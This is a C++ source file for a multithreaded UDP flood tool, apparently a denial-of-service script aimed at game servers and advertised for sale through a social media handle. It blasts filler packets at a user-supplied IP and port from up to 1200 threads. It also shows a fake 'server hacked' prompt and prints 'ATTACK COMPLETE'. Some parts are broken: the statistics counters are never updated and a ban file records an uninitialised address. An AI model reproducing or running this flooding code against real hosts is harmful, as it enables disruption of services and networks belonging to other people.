#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <fstream>

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;
std::vector<std::string> blockedPlayers;

void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) return;

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    char* packet = new char[packetSize];
    std::memset(packet, 'A', packetSize);
    packet[packetSize - 1] = '\0';
    
    auto startTime = std::chrono::steady_clock::now();
    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count() >= durationSeconds) break;
        sendto(udpSocket, packet, packetSize, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    }
    delete[] packet;
    close(udpSocket);
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) return;

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);
    bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    
    char buffer[packetSize];
    socklen_t clientLen = sizeof(struct sockaddr_in);
    struct sockaddr_in clientAddr;

    std::cout << "YOUR SERVER HAS BEEN HACKED! TYPE 'OKAY' OR 'NO': ";
    std::string response;
    std::cin >> response;
    if (response == "NO") {
        std::ofstream banFile("banned_players.txt", std::ios::app);
        banFile << inet_ntoa(clientAddr.sin_addr) << std::endl;
        banFile.close();
        std::cout << "You are permanently banned from the game!" << std::endl;
        exit(0);
    } else if (response == "OKAY") {
        std::cout << "Exiting game..." << std::endl;
        exit(0);
    }
    close(udpSocket);
}

int main(int argc, char* argv[]) {
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is a fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n";

    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> [threads]\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);
    int numThreads = (argc == 6) ? std::stoi(argv[5]) : DEFAULT_NUM_THREADS;

    std::thread receiverThread(packetReceiver, targetPort, packetSize);
    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize);
    }

    for (auto& t : senderThreads) t.join();
    keepSending = false;
    keepReceiving = false;
    receiverThread.join();

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << "\n";
    std::cout << "Total Data: " << totalDataMB << " MB\n";
    std::cout << "DM to buy at - @Rohan2349\n";
    return 0;
}
